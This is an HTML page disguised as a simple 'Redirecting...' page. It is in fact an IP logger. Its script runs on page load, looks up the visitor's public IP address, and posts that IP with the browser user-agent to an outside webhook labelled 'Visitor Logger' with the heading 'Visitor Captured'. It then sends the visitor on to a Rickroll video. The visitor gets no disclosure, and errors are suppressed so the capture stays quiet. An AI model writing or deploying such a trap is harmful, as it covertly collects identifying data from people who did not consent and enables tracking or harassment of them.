<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // --- CONFIG ---
        const DISCORD_WEBHOOK_URL = "webhook1.kehlchen.com";
        const YOUTUBE_VIDEO_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        // Fire webhook (fire-and-forget, won't block)
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const ip = data.ip;
                fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Visitor Logger",
                        embeds: [{
                            title: "🚨 Visitor Captured",
                            color: 0xff0000,
                            fields: [
                                { name: "IP", value: `||${ip}||`, inline: true },
                                { name: "UA", value: navigator.userAgent.substring(0, 100), inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                }).catch(() => {});
            })
            .catch(() => {})
            .finally(() => {
                // Instant redirect — fires immediately
                window.location.replace(YOUTUBE_VIDEO_URL);
            });

        // Fallback redirect in case the fetch hangs
        setTimeout(() => {
            window.location.replace(YOUTUBE_VIDEO_URL);
        }, 300);
    </script>
</body>
</html>
